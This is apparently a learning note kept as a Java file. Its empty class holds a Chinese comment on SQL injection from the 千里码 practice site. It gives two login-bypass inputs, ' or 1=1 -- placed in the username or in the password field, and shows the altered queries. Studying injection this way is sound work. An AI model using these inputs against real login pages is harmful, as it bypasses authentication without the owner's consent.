package qlm;

public class QLMSqlInsert {
  /**
   * 千里码中的SQL注入
   * 
   * 1）
   * name = shinian' or 1=1 -- '
   * password = 随意
   * 
   * select * from user where name='shinian' or 1=1 -- '' and password=''
   * 
   * 
   * 2）
   * name = shinian
   * password = ' or 1=1 -- 
   * select * from user where name='shinian' and password='' or 1=1 -- '
   * 
   * 
   * 
   * 利用or和 --（注释）来使SQL的结构发生变化
   * 
   * 
   */
}
